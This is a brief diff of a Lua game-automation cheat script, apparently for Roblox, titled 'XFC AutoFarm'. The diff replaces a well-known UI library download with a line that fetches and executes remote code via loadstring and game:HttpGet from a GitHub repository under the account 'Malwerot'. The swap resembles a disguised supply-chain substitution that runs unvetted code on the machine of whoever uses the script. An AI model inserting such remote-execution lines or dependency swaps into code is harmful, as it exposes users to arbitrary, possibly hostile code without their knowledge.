@@ -119,7 +119,7 @@ local function stopAutoFarm()
 end
 
 -- UI (depois que tudo está pronto)
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Malwerot/test1/refs/heads/main/UUII.lua"))()
 local Window = Library.CreateLib("XFC AutoFarm", "DarkTheme")
 
 local TabFarm = Window:NewTab("AutoFarm")
